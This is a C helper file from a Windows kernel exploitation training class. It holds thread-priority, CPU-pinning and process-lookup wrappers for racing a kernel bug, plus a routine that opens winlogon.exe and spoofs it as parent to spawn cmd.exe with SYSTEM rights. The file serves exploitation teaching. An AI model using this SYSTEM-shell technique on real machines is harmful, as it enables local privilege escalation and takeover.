/*
    This file is licensed under a Creative Commons "Share Alike" license
    https://creativecommons.org/licenses/by-sa/4.0/

    You must indicate that derivative work 
    "Is derived from Cedric Halbronn's 
    'Exploitation 4011 - Windows Kernel Exploitation' 
    class, available at https://ost2.fyi"
*/
// Windows wrappers and helpers
#include <stdio.h>
#include <time.h>
#include <windows.h>
#include <tlhelp32.h>
#include "winhelpers.h"

#pragma comment (lib, "User32.lib")
#pragma comment (lib, "Shell32.lib")

#define DPRINTF(fmt, ...) do { \
    if (g_debug >= 1) { printf(fmt, __VA_ARGS__); } \
} while (0)

/**
 * Wrapper for exit() so we can easily see when an error occurs
 *
 * @return none
 */
void
early_exit(int _Code)
{
    printf("WARNING: early exit\n");
    exit(_Code);
}

/**
 * Since we are exploiting a race condition, we rely on having at least
 * 2 threads running on 2 different CPU cores so we use this function
 * to retrieve the number of CPU cores supported by the hardware we are
 * currently running on
 */
int
get_core_count(void)
{
	SYSTEM_INFO sysinfo;
	GetSystemInfo(&sysinfo);
	return sysinfo.dwNumberOfProcessors;
}

/**
 * Change the given thread's priority.
 *
 * @param[in] hThread Thread's handle
 * @param[in] nPriority New priority to assign to the thread
 * @return TRUE on success, exits on error
 */
BOOL
set_thread_priority(HANDLE hThread, int nPriority)
{
	BOOL bRet;
	bRet = SetThreadPriority(hThread, nPriority);
	if (!bRet) {
		printf("SetThreadPriority failed: %d\n", GetLastError());
		exit(EXIT_FAILURE);
	}
	return TRUE;
}

/**
 * Change the current thread's priority.
 *
 * @param[in] nPriority New priority to assign to the thread
 * @return TRUE on success, exits on error
 */
BOOL
set_priority(int nPriority)
{
	BOOL bRet;
	bRet = SetThreadPriority(GetCurrentThread(), nPriority);
	if (!bRet) {
		printf("SetThreadPriority failed: %d\n", GetLastError());
		exit(EXIT_FAILURE);
	}
	return TRUE;
}

/**
 * Change the current thread's priority and current process's priority class.
 *
 * @param[in] nPriority New priority to assign to the thread
 * @param[in] nClass New class to assign to the thread
 * @return TRUE on success, exits on error
 */
BOOL
set_priority_and_class(int nPriority, int nClass)
{
	BOOL bRet;
	bRet = SetPriorityClass(GetCurrentProcess(), nClass);
	if (!bRet) {
		printf("SetThreadPriority failed: %d\n", GetLastError());
		exit(EXIT_FAILURE);
	}
	set_priority(nPriority);
	return TRUE;
}

BOOL pin_name_to_cpu(char* name, size_t cpuid, BOOL bExitOnFailure) {
	// 1i64 to shut the compiler up
	DWORD_PTR dwRet = SetThreadAffinityMask(GetCurrentThread(), 1i64 << cpuid);
	if (!dwRet) {
		printf("SetThreadAffinityMask failed: %d\n", GetLastError());
		if (bExitOnFailure) {
			early_exit(EXIT_FAILURE);
		}
		return FALSE;
	}
	printf("[+] Pinned \"%s\" thread to cpu %zu\n", name, cpuid);

	return TRUE;
}

/**
* Create a new thread and run the associated function
*
* @param[in] func - Function to run in new thread
* @param[in] lpParam - Parameter for new thread
* @param[in] pThreadId - Where to store the new threadid
* @param[in] BOOL bExitOnFailure - Should the program exit on function failure
* @return The open handle to the new thread
*/
HANDLE
xCreateThread(void* func, void* lpParam, PDWORD pThreadId, BOOL bExitOnFailure)
{
	HANDLE hThread = CreateThread(
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)func,
		lpParam,
		0,
		pThreadId
	);

	if (INVALID_HANDLE_VALUE == hThread) {
		printf("Failed to create thread\n");
		if (bExitOnFailure) {
			early_exit(EXIT_FAILURE);
		}
	}

	return hThread;
}

DWORD GetProcessIDByName(const wchar_t* processName) {
    PROCESSENTRY32 pe32;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName) == 0) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return 0;
}

void CreateProcessFromHandle(HANDLE hProcess) {
    int error;
    BOOL status;
    SIZE_T size = 0;
    LPVOID lpValue = NULL;
    STARTUPINFOEXW si;
    ZeroMemory(&si, sizeof(si));
    si.StartupInfo.cb = sizeof(si);
    si.lpAttributeList = NULL;
    wchar_t cmd_process[] = L"C:\\Windows\\System32\\cmd.exe";


    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    // Initialize the thread attribute list
    do
    {
        status = InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
        error = GetLastError();

        if (!status)
        {
            if (si.lpAttributeList != NULL)
                HeapFree(GetProcessHeap(), 0, si.lpAttributeList);

            si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
            ZeroMemory(si.lpAttributeList, size);
        }
    } while (!status && error == ERROR_INSUFFICIENT_BUFFER);

    // Update the thread attribute with the parent process handle
    do
    {
        if (!status)
        {
            printf("[-] Failed to initialize thread attribute list.\n");
            printf("    |-> %d\n", error);
            break;
        }

        lpValue = HeapAlloc(GetProcessHeap(), 0, sizeof(HANDLE));
        memcpy(lpValue, &hProcess, sizeof(HANDLE));

        status = UpdateProcThreadAttribute(
            si.lpAttributeList,
            0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            lpValue,
            sizeof(HANDLE),
            NULL,
            NULL);

        if (!status)
        {
            error = GetLastError();
            printf("[-] Failed to update thread attribute.\n");
            printf("    |-> %d\n", error);
            break;
        }

        status = CreateProcessW(NULL, (LPWSTR)cmd_process, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL, NULL, &si.StartupInfo, &pi);

        if (!status)
        {
            error = GetLastError();
            printf("[-] Failed to create new process.\n");
            printf("    |-> %d\n", error);
        }
        else
        {
            printf("[+] New process created successfully.\n");
            printf("    |-> PID : %lu\n", pi.dwProcessId);
            printf("    |-> TID : %lu\n", pi.dwThreadId);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
    } while (0);

    // Clean up allocated memory
    if (lpValue != NULL)
        HeapFree(GetProcessHeap(), 0, lpValue);

    if (si.lpAttributeList != NULL)
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
}

int spwan_cmd_system() {
    DWORD winlogonPID;

    winlogonPID = GetProcessIDByName(L"winlogon.exe");
    if (winlogonPID == 0) {
        printf("Failed to find winlogon.exe process.\n");
        return 1;
    }

    HANDLE hProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, winlogonPID);
    if (!hProcess) {
        printf("OpenProcess failed. LastError: %lu\n", GetLastError());
        return 1;
    }

    CreateProcessFromHandle(hProcess);

    // We are done
    CloseHandle(hProcess);
    return 0;
}
